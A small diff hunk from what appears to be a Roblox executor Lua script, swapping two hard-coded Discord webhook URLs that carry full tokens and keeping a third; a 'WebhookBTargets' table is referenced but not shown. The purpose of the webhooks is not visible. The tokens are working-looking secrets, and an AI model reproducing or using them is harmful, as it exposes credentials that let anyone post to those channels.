@@ -26,8 +26,8 @@ getgenv().WebhookBTargets = {
 }
 
 --// 🌐 Webhooks
-local webhookA_Temprana = "https://discord.com/api/webhooks/1406038878879748229/o0w6vCqGVaWt-ay64pLieGdnXk9Kwwfu4c2m9eTdlcpUTeMkY0Qaoj1btieclAL3vZri"
-local webhookA = "https://discord.com/api/webhooks/1404942415525183599/41L2bmvHY8XUiFzeJA96gBIxc4wnlLGdY8jxulVcOzpvW-ZyhZRn3PTGApQvCTnu_BtQ"
+local webhookA_Temprana = "https://discord.com/api/webhooks/1409072147879563274/bsZaeYNtdsoYzAPW7FtgQslIoVU7DNFFAFyliB-qAfhOmrpjRMtFXpOPy0YpzchlwAR3"
+local webhookA = "https://discord.com/api/webhooks/1409072147879563274/bsZaeYNtdsoYzAPW7FtgQslIoVU7DNFFAFyliB-qAfhOmrpjRMtFXpOPy0YpzchlwAR3"
 local webhookB = "https://discord.com/api/webhooks/1404225086940250203/VJzWDW_vkq6iid9CyrPfZeUYOHt2u9d12YaOuE_cJ6VieoHMd7kb5N4PdZqvxgz85VuU"
 
 --// 🔧 Services
